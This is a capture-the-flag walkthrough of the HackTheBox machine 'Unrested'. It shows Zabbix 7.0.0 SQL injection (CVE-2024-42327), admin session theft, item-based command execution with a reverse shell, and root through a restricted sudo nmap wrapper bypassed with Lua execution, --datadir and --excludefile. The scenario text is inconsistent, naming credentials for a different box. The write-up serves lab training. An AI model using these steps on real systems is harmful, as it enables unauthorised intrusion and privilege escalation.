---
title: HTB: Unrested
url: https://0xdf.gitlab.io/2025/03/04/htb-unrested.html
date: 2025-03-04T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-unrested, assume-breach, nmap, zabbix, burp, burp-repeater, cve-2024-42327, sqli, cve-2024-36467
---

![Unrested](/img/unrested-cover.png)

Unrested is all about a Zabbix server and a critical vulnerability that was made public in December 2024. It’s a SQL injection vulnerability, and I’ll deep dive into the source to see how it works, and how to exploit it. Most solutions to this box show blind SQL injection, I’ll show how to use the source code to figure out how to get data back from the DB. For root, I’ll abuse sudo nmap with a custom wrapper that breaks the published GTFObins. In Beyond Root, I’ll look at another vulnerability that came out at the same time, and show what the super admin role looks like in the GUI by escalating my user to that role.

## Box Info

| Name | [Unrested](https://hackthebox.com/machines/unrested)  [Unrested](https://hackthebox.com/machines/unrested) [Play on HackTheBox](https://hackthebox.com/machines/unrested) |
| --- | --- |
| Release Date | [05 Dec 2024](https://twitter.com/hackthebox_eu/status/1865410968584352071) |
| Retire Date | 05 Dec 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |
| Scenario | As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09 |

## Recon

### nmap

`nmap` finds four open TCP ports, SSH (22), HTTP (80), and two unknown ports (10050, 10051):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 14:16 UTC
Nmap scan report for 10.10.11.50
Host is up (0.087s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent
10051/tcp open  zabbix-trapper

Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
oxdf@hacky$ nmap -p 22,80,10050,10051 -sCV 10.10.11.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 14:17 UTC
Nmap scan report for 10.10.11.50
Host is up (0.085s latency).

PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http                Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
10050/tcp open  tcpwrapped
10051/tcp open  ssl/zabbix-trapper?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

### Initial Credentials

This box is meant to simulate a web application pentest, where it is common to have an account on the application to completely test it. The site says:

As is common in Windows pentests, you will start the Certified box with credentials for the following account:  
Username: judith.mader Password: judith09

### Zabbix - TCP 80

#### Unauthenticated Site

The website on TCP 80 is an instance of Zabbix:

![image-20250228092616361](/img/image-20250228092616361.png)

[Zabbix](https://www.zabbix.com/) is an open-source enterprise monitoring software.

[This post](https://www.zabbix.com/forum/zabbix-help/47241-zabbix-agent-and-server-ports) on the Zabbix forums suggests that ports 10050 and 10051 have to do with Zabbix as well. I’m not able to get anything else out of these with `curl` or `nc`.

Not much else I can do here without creds.

#### Authenticated Site

On giving the provided creds, I’m able to log into the site and get a dashboard:

![image-20250228094137278](/img/image-20250228094137278.png)

#### Tech Stack

[Zabbix source](https://github.com/zabbix/zabbix) shows it’s written in PHP, and loading `/zabbix/` as `/zabbix/index.php` works. The dashboard also natively loads as `/zabbix/zabbix.php` after logging in.

The initial HTTP response sets a `zbx_session` cookie:

```

HTTP/1.1 200 OK
Date: Fri, 28 Feb 2025 14:27:35 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
Set-Cookie: zbx_session=eyJzZXNzaW9uaWQiOiIwYTAyYzlmMzFmMzNmNTY3Y2Q5NDkxMTY5OWE5NzA4YyIsInNpZ24iOiI3NTQxNzhkMWQ5Y2ExZjIyNWU0MDVhNGMzZDhhMjQ3M2Q5OWYzODgzMzVlMjIxYmJhYTE4NmMwMTUxNjdjNzg2In0%3D; path=/zabbix; HttpOnly
Vary: Accept-Encoding
Content-Length: 3909
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

```

The cookie looks like base64, and it is:

```

oxdf@hacky$ echo "eyJzZXNzaW9uaWQiOiIwYTAyYzlmMzFmMzNmNTY3Y2Q5NDkxMTY5OWE5NzA4YyIsInNpZ24iOiI3NTQxNzhkMWQ5Y2ExZjIyNWU0MDVhNGMzZDhhMjQ3M2Q5OWYzODgzMzVlMjIxYmJhYTE4NmMwMTUxNjdjNzg2In0=" | base64 -d | jq .
{
  "sessionid": "0a02c9f31f33f567cd94911699a9708c",
  "sign": "754178d1d9ca1f225e405a4c3d8a2473d99f388335e221bbaa186c015167c786"
}

```

In the dashboard and at the footer of the authenticated site, it shows the version as 7.0.0:

![image-20250228134929550](/img/image-20250228134929550.png)

The 404 page is the [default Apache 404](/cheatsheets/404#apache--httpd):

![image-20250228093414340](/img/image-20250228093414340.png)

I’ll skip the directory brute force given that the source is public.

### API Enumeration

#### General Interaction

I’m going to need some basic understanding of how to work with the Zabbix API, which is documented [here](https://www.zabbix.com/documentation/current/en/manual/api).

Without any auth, I can request the version:

```

oxdf@hacky$ curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc": "2.0", "method": "apiinfo.version", "params": {}, "id": 1}'
{"jsonrpc":"2.0","result":"7.0.0","id":1}

```

#### Auth

I’ll use the given creds to get a token:

```

oxdf@hacky$ curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "matthew", "password": "96qzn0h2e1k3"}, "id": 1}'
{"jsonrpc":"2.0","result":"d2a3d7abe1800ee24ab7d729df6c5439","id":1}

```

I can use a `bash` one-liner to get a token and save it in an environment variable to easier use:

```

oxdf@hacky$ token=$(curl http://10.10.11.50/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "matthew", "password": "96qzn0h2e1k3"}, "id": 1}' -s | jq -r .result)
(venv) oxdf@hacky$ echo "$token"
b8d0a591918636dd028247ebc141cbd8

```

I could also go to Burp and get requests going in Repeater. There’s a `user.checkAuthentication` API that will show details about a given sessionid:

![image-20250228142158649](/img/image-20250228142158649.png)

Most API endpoints take the token in an authorization header. For example, this endpoint returns unauthorized:

![image-20250228142441462](/img/image-20250228142441462.png)

When I add in the token in an `Authorization` header, it does:

![image-20250228142536613](/img/image-20250228142536613.png)

#### Users

In theory, I should be able to use the [user.get](https://www.zabbix.com/documentation/current/en/manual/api/reference/user/get) endpoint to get a list of all users. The site says:

> Note: This method is available to users of any type. Permissions to call the method can be revoked in user role settings. See [User roles](https://www.zabbix.com/documentation/current/en/manual/web_interface/frontend_sections/users/user_roles) for more information.

If I try though, it returns nothing:

![image-20250228144812880](/img/image-20250228144812880.png)

If I add in the `editable` field, it does return information about my user (I’ll show why shortly):

![image-20250228144838411](/img/image-20250228144838411.png)

I’ll note matthew has a `userid` of 3.

I can also request groups the same way, but don’t get any:

![image-20250228151617589](/img/image-20250228151617589.png)

Again, likely this server is set up to require admins for this request.

## Shell as zabbix

### Identify CVEs

Searching for CVEs in Zabbix 7.0.0, I’ll come across two solid options:
- [CVE-2024-36467](https://nvd.nist.gov/vuln/detail/CVE-2024-36467) - An authenticated user with API access (e.g.: user with default User role), more specifically a user with access to the user.update API endpoint is enough to be able to add themselves to any group (e.g.: Zabbix Administrators), except to groups that are disabled or having restricted GUI access.
- [CVE-2024-42327](https://nvd.nist.gov/vuln/detail/CVE-2024-42327) - A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.

It turns out that being in the Zabbix Administrators group doesn’t buy that much in this configuration. I’ll look at CVE-2024-36467 in [Beyond Root](#cve-2024-36467).

I’ll focus on CVE-2024-42327 now.

### CVE-2024-42327

#### Background

The Nist description says that the injection is in the `CUser` class in the `addRelatedObjects` function which is accessed via the `get` function. `get` is in `CUser.php` on [lines 68-243](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L68-L243). `addRelatedObjects` is called on [line 234](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L233-L235):

```

if ($result) {
    $result = $this->addRelatedObjects($options, $result);
}

```

This function is responsible for getting other information associated with a user that isn’t stored with the user table in the database, such as groups, media, and roles. In the section about roles at the end of the function, there is this code:

```

// adding user role
if ($options['selectRole'] !== null && $options['selectRole'] !== API_OUTPUT_COUNT) {
    if ($options['selectRole'] === API_OUTPUT_EXTEND) {
        $options['selectRole'] = ['roleid', 'name', 'type', 'readonly'];
    }

    $db_roles = DBselect(
        'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
        ' FROM users u,role r'.
        ' WHERE u.roleid=r.roleid'.
        ' AND '.dbConditionInt('u.userid', $userIds)
    );

    foreach ($result as $userid => $user) {
        $result[$userid]['role'] = [];
    }

    while ($db_role = DBfetch($db_roles)) {
        $userid = $db_role['userid'];
        unset($db_role['userid']);

        $result[$userid]['role'] = $db_role;
    }
}

return $result;
}

```

Specifically on [lines 3046-3051](https://github.com/zabbix/zabbix/blob/49955f1fb5c9168a8a24b053f7ade6b3d903143c/ui/include/classes/api/services/CUser.php#L3046C1-L3051C6) there’s a call to `DBselect` using a query build from unsanitized user input.

#### Crashing SQLI

If I try to send just a `'` to crash it as a regular user, it won’t work:

![image-20250228183600574](/img/image-20250228183600574.png)

That’s because of this permissions check on [lines 107-121](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L107-L121) in `get`:

```

// permission check
if (self::$userData['type'] != USER_TYPE_SUPER_ADMIN) {
    if (!$options['editable']) {
        $sqlParts['from']['users_groups'] = 'users_groups ug';
        $sqlParts['where']['uug'] = 'u.userid=ug.userid';
        $sqlParts['where'][] = 'ug.usrgrpid IN ('.
            ' SELECT uug.usrgrpid'.
            ' FROM users_groups uug'.
            ' WHERE uug.userid='.self::$userData['userid'].
        ')';
    }
    else {
        $sqlParts['where'][] = 'u.userid='.self::$userData['userid'];
    }
}

```

I have to either provide the `editable` option, or my user has to have the correct permissions. Adding `editable` works:

![image-20250228184346642](/img/image-20250228184346642.png)

That’s a good sign that I’ve started SQL injection.

Interestingly, if I use CVE-2024-36467 to add the matthew user to the Zabbix Administrators group, `editable` is not needed.

#### SQLI POC

The code generating the query is:

```

$db_roles = DBselect(
    'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
    ' FROM users u,role r'.
    ' WHERE u.roleid=r.roleid'.
    ' AND '.dbConditionInt('u.userid', $userIds)
);

```

It’s taking the `selectRole` option and joining all of them with `,r.`. So if I passed in `["role1", "role2"]`, it would generate:

```

SELECT u.userid,r.role1,r.role2 FROM users u, role r WHERE u.roleid=role.roleid AND u.userid in [$userIds];

```

There’s almost certainly a blind attack here, but if I want to get data back, I need to include the `FROM users u, role r WHERE u.roleid=r.roleid r;-- -` in my query.

To build this up, I’ll start with a simple query to get the role name (and use `"output": []` to just show that, getting rid of the user data noise):

![image-20250228190122507](/img/image-20250228190122507.png)

It is showing the user role, because that’s the role associated with my user id. I should be able to inject to have it show all roles:

![image-20250228190317772](/img/image-20250228190317772.png)

This effectively makes the query:

```

SELECT u.userid,r.name from users u, role r WHERE u.roleid=r.roleid; -- - FROM users u, role r WHERE u.roleid=role.roleid AND u.userid in [$userIds];

```

Instead of filtering based on my id, it returns all ids.

#### SQLI Read POC

Getting the full list of roles is not super useful. I want to read other tables. To do that, I’ll start by adding another thing to read besides name. If I include a 1 as well, it will print that for each value:

![image-20250228191205566](/img/image-20250228191205566.png)

I can change that into a subquery:

![image-20250228191101094](/img/image-20250228191101094.png)

The sub-query must return a single value, but I can use `group_concat` to achieve that, and try to read something:

![image-20250228191015573](/img/image-20250228191015573.png)

That’s all three users - Admin, guest, and matthew!

#### DB Enumeration

Based on the success of `group_concat`, it is likely a MySQL DB. To check for sure, I’ll try string concatenation as shown on the [PortSwigger CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet):

![image-20250228191651802](/img/image-20250228191651802.png)

![image-20250228191748913](/img/image-20250228191748913.png)

That’s MySQL. `@@version` works too:

![image-20250228191822548](/img/image-20250228191822548.png)

I can read the table names, but it’s long:

![image-20250228192000241](/img/image-20250228192000241.png)

### RCE

#### Strategy

Rather than try to figure out the DB through injection, I’ll look for ways to abuse Zabbix via SQL injection. [This script](https://github.com/freeworkaz/zabbix_test/blob/master/zabbix_shell_create_on_Linux.py) shows abusing the `item.create` API to get RCE. This does require Super Admin role.

To achieve this, I’ll try to get a session as the Admin user.

#### Read Admin Session

Session ids are held in the `sessions` table in the `sessiondid` column. I only want the session from the Admin user (which I’ve observed to have a `userid` of 1), so I can limit to that and drop the `group_concat`:

![image-20250228193150225](/img/image-20250228193150225.png)

It works!

![image-20250228193402091](/img/image-20250228193402091.png)

#### RCE POC

To execute a command, I need to have a `hostid`. I’ll use the `host.get` API to list the hosts (which now works as admin):

![image-20250228194431256](/img/image-20250228194431256.png)

I’ll need the `hostid` and the `interfaceid` for the command execution.

To create the item, I’ll use the command from the [script POC](https://github.com/freeworkaz/zabbix_test/blob/master/zabbix_shell_create_on_Linux.py). I’ll start with a simple `curl` to make sure it works:

![image-20250228194749848](/img/image-20250228194749848.png)

It takes a minute or so to process, but then I get a request at my server:

```
10.10.11.50 - - [01/Mar/2025 00:48:02] code 404, message File not found
10.10.11.50 - - [01/Mar/2025 00:48:02] "GET /rce HTTP/1.1" 404 -

```

#### Reverse Shell

I’ll update the command to a reverse shell:

![image-20250228194923402](/img/image-20250228194923402.png)

After a short wait, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.50 60818
bash: cannot set terminal process group (2809): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@unrested:/$

```

I’ll upgrade it using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

zabbix@unrested:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
zabbix@unrested:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
zabbix@unrested:/$ 

```

zabbix is able to read `user.txt` from `/home/matthew`:

```

zabbix@unrested:/home/matthew$ cat user.txt
262e6aa3************************

```

## Shell as root

### Enumeration

The zabbix user is able to run `nmap` as any user without a password:

```

zabbix@unrested:/home/matthew$ sudo -l
Matching Defaults entries for zabbix on unrested:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on unrested:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap *

```

### Fails

#### Script Mode / Interactive / File Input

A command technique to get execution through `nmap` is using the `--script` argument. I’ll create a dummy script:

```

zabbix@unrested:~$ echo 'os.execute("/bin/bash")' > test.sh

```

This will just return a shell when run. Now run `nmap` and pass it the script:

```

zabbix@unrested:~$ sudo nmap --script=test.sh            
Script mode is disabled for security reasons.

```

The same thing happens when trying to run `nmap` with `--interactive`:

```

zabbix@unrested:~$ sudo nmap --interactive
Interactive mode is disabled for security reasons.

```

Another trick I might try is `-iL /root/root.txt`, which would use the contents of `root.txt` as a target and it would be printed back to the console. It’s blocked as well:

```

zabbix@unrested:~$ sudo nmap -iL /root/root.txt
File input mode is disabled for security reasons.

```

#### Restrictive nmap for Zabbix

`/usr/bin/nmap` is not actually the `nmap` binary, but a Bash script:

```

zabbix@unrested:~$ cat /usr/bin/nmap                          
#!/bin/bash
#################################
## Restrictive nmap for Zabbix ##
#################################
# List of restricted options and corresponding error messages
declare -A RESTRICTED_OPTIONS=(
    ["--interactive"]="Interactive mode is disabled for security reasons."
    ["--script"]="Script mode is disabled for security reasons."
    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
    ["-iL"]="File input mode is disabled for security reasons."
# Check if any restricted options are used
for option in "${!RESTRICTED_OPTIONS[@]}"; do
    if [[ "$*" == *"$option"* ]]; then
        echo "${RESTRICTED_OPTIONS[$option]}"
        exit 1
    fi
done
# Execute the original nmap binary with the provided arguments
exec /usr/bin/nmap.original "$@"

```

It checks if any of the `RESTRICTED_OPTIONS` strings are in the command run, it prints the error and exits. If none of these are present, then it runs `/usr/bin/nmap.original`.

### Success

I’ll show three ways to get `root.txt` using `nmap`:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A-->F(<a href='#one-dash-script'>One dash\nscript</a>);
    F-->C;
    A[Shell as zabbix]-->B(<a href='#data-directory'>Data Directory</a>);
    B-->C[Shell as root];
    A-->D(<a href='#exclude-file'>Exclude File</a>);
    D-->E[Read root.txt];

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3,6,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### One Dash Script

The easiest way to get root from here is a twist on the `--script` argument. `nmap` is nice enough to handle `-script` just as it would `--script`. But the wrapper script isn’t checking for that!

So I can:

```

zabbix@unrested:~$ echo 'os.execute("/bin/bash")' > test.sh
zabbix@unrested:~$ sudo nmap -script=test.sh                
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:17 UTC
NSE: Warning: Loading 'test.sh' -- the recommended file extension is '.nse'.
root@unrested:/var/lib/zabbix# reset: unknown terminal type unknown
Terminal type? screen
root@unrested:/var/lib/zabbix# id
uid=0(root) gid=0(root) groups=0(root)

```

When I first get a root prompt out of `nmap`, nothing I type is shown, but a `reset` command fixes that and it’s a fully functional terminal, good enough to read the flag:

```

root@unrested:/var/lib/zabbix# cat /root/root.txt
2111a8ca************************

```

#### Data Directory

The intended path for this box is to abuse the `--datadir` option, which the man page for `nmap` says:

> ```

>    --datadir directoryname (Specify custom Nmap data file location)
>        Nmap obtains some special data at runtime in files named nmap-service-probes, nmap-services,
>        nmap-protocols, nmap-rpc, nmap-mac-prefixes, and nmap-os-db. If the location of any of these files has
>        been specified (using the --servicedb or --versiondb options), that location is used for that file.
>        After that, Nmap searches these files in the directory specified with the --datadir option (if any). Any
>        files not found there, are searched for in the directory specified by the NMAPDIR environment variable.
>        Next comes ~/.nmap for real and effective UIDs; or on Windows, HOME\AppData\Roaming\nmap (where HOME is
>        the user's home directory, like C:\Users\user). This is followed by the location of the nmap executable
>        and the same location with ../share/nmap appended. Then a compiled-in location such as
>        /usr/local/share/nmap or /usr/share/nmap.
>
> ```

The default value is `/usr/share/nmap`:

```

zabbix@unrested:~$ ls /usr/share/nmap/
nmap.dtd           nmap-payloads   nmap-service-probes  nselib
nmap-mac-prefixes  nmap-protocols  nmap-services        nse_main.lua
nmap-os-db         nmap-rpc        nmap.xsl             scripts

```

Right away `nse_main.lua` jumps out as interesting. That’s the runs every time `nmap` runs with `-sC`. So if I create a new one and tell `nmap` that that directory is the data dir, it will load that:

```

zabbix@unrested:~$ echo 'os.execute("/bin/bash")' > /tmp/nse_main.lua
zabbix@unrested:~$ sudo /usr/bin/nmap --datadir /tmp -sC localhost   
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:25 UTC
root@unrested:/var/lib/zabbix# reset: unknown terminal type unknown
Terminal type? screen
root@unrested:/var/lib/zabbix# id
uid=0(root) gid=0(root) groups=0(root)

```

Just like above, I have to `reset` to get the terminal working, but it works! And I can read the flag:

```

root@unrested:/var/lib/zabbix# cat /root/root.txt
2111a8ca************************

```

#### Exclude File

Just like the blocked `-iL`, there’s an `--excludefile` option:

> ```

>   --excludefile exclude_file (Exclude list from file)
>       This offers the same functionality as the --exclude option, except that the excluded targets are
>       provided in a newline-, space-, or tab-delimited exclude_file rather than on the command line.
>    
>       The exclude file may contain comments that start with # and extend to the end of the line.
>
> ```

Anything that’s using a file as targets can be a file read. It works here:

```

zabbix@unrested:~$ sudo nmap --excludefile /root/root.txt localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:28 UTC
Error resolving name "2111a8ca************************": Temporary failure in name resolution

QUITTING!

```

It errors trying to treat the flag like a host and prints it!

## Beyond Root

### CVE-2024-36467

#### Background

The `user.update` API is executed by the `update` function in the `CUser` class defined in `CUser.php` in the [Zabbit source](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L358-L363):

```

public function update(array $users) {
    $this->validateUpdate($users, $db_users);
    self::updateForce($users, $db_users);

    return ['userids' => array_column($users, 'userid')];
}

```

This is very simple code. As long as `$this.validateUpdate` returns, it will update the user.

If I try to set my user’s role to Super Admin (role 3), it returns with an error message:

![image-20250228162726715](/img/image-20250228162726715.png)

The `validateUpdate` code is very long ([lines 371-543](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L371-L543)). The last line of this function calls `checkHimself` (defined on [lines 1109-1135](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L1109-L1135)):

```

private function checkHimself(array $users) {
    foreach ($users as $user) {
        if (bccomp($user['userid'], self::$userData['userid']) == 0) {
            if (array_key_exists('roleid', $user) && $user['roleid'] != self::$userData['roleid']) {
                self::exception(ZBX_API_ERROR_PARAMETERS, _('User cannot change own role.'));
            }

            if (array_key_exists('usrgrps', $user)) {
                $db_usrgrps = DB::select('usrgrp', [
                    'output' => ['gui_access', 'users_status'],
                    'usrgrpids' => zbx_objectValues($user['usrgrps'], 'usrgrpid')
                ]);

                foreach ($db_usrgrps as $db_usrgrp) {
                    if ($db_usrgrp['gui_access'] == GROUP_GUI_ACCESS_DISABLED
                            || $db_usrgrp['users_status'] == GROUP_STATUS_DISABLED) {
                        self::exception(ZBX_API_ERROR_PARAMETERS,
                            _('User cannot add himself to a disabled group or a group with disabled GUI access.')
                        );
                    }
                }
            }

            break;
        }
    }
}

```

At the top, it checks if the `roleid` key is in the data, and if so, there’s a check to see that the logged in user doesn’t match the user in the data.

That same check isn’t made if `usrgrps` exists in the update. It only checks if the target group is disabled.

#### Execute

To run this, I’ll hit the `user.update` API with new groups. It doesn’t return an error, which indicates success:

![image-20250228163212586](/img/image-20250228163212586.png)

If I query `user.get` now, the result is different:

![image-20250228163306417](/img/image-20250228163306417.png)

It’s showing all the users now. Scrolling down to matthew, they are in the Zabbix Administrators group:

```

{
  "userid":"3",
  "username":"matthew",
  "name":"Matthew",
  ...[snip]...
  "usrgrps":[
    {"usrgrpid":"7","name":"Zabbix administrators"},
    {"usrgrpid":"13","name":"Internal"}
  ]
}

```

#### Deadend

For Unrested, being in the Zabbix Administrators group doesn’t really buy me anything. Logging back into the GUI, I still can’t see much of a difference.

The real top privilege comes with the Super Admin role (which I’ll show [below](#super-admin)). I do have access to more API endpoints, but they aren’t ones that seem to buy much. Logging into the GUI doesn’t show anything different to exploit.

There are likely some common misconfigurations that a Super Admin could make that would give this group some way to do something nefarious from here, but in this relatively default configuration, it’s a dead end.

### Super Admin

#### Get Role

To see the Super Admin role and how it differs from the Zabbix Administrators group, I’ll go into the database. The Zabbix DB config information is in `/etc/zabbix/zabbix_server.conf`:

```

...[snip]...
DBName=zabbix
...[snip]...
DBUser=zabbix
...[snip]...
DBPassword=ZabberzPassword2024!
...[snip]...

```

I’ll connect to `mysql`:

```

root@unrested:/etc/zabbix# mysql -u zabbix -pZabberzPassword2024!
...[snip]...
MariaDB [(none)]> use zabbix                               
...[snip]...
MariaDB [zabbix]>

```

The `users` table has three users, as I saw during the injection:

```

MariaDB [zabbix]> select * from users;                                                                                +--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
-------+--------+-----------------+----------------+
| userid | username | name    | surname       | passwd                                                       | url | a
utologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | ti
mezone | roleid | userdirectoryid | ts_provisioned |       
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
-------+--------+-----------------+----------------+       
|      1 | Admin    | Zabbix  | Administrator | $2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a |     |  
       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
fault  |      3 |            NULL |              0 |
|      2 | guest    |         |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |  
       0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | de
fault  |      4 |            NULL |              0 |
|      3 | matthew  | Matthew | Smith         | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |  
       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
fault  |      1 |            NULL |              0 |
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
-------+--------+-----------------+----------------+
3 rows in set (0.001 sec)

```

I’ll set the Admin user to have the same password as matthew:

```

MariaDB [zabbix]> update users set passwd = '$2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS' where userid = 1;
Query OK, 1 row affected (0.001 sec)
Rows matched: 1  Changed: 1  Warnings: 0

```

It worked:

```

MariaDB [zabbix]> select * from users;                                           
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
-------+--------+-----------------+----------------+
| userid | username | name    | surname       | passwd                                                       | url | a
utologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | ti
mezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
-------+--------+-----------------+----------------+
|      1 | Admin    | Zabbix  | Administrator | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |  
       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
fault  |      3 |            NULL |              0 |
|      2 | guest    |         |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |  
       0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | de
fault  |      4 |            NULL |              0 |
|      3 | matthew  | Matthew | Smith         | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |  
       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
fault  |      1 |            NULL |              0 |
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
-------+--------+-----------------+----------------+
3 rows in set (0.001 sec)

```

#### GUI View

Logging in as Admin / 96qzn0h2e1k3 shows me a ton more menus:

![image-20250228215539580](/img/image-20250228215539580.png)

Under “Data collection” –> “Hosts” –> “Items” I’ll see my RCE attempts:

![image-20250228215907346](/img/image-20250228215907346.png)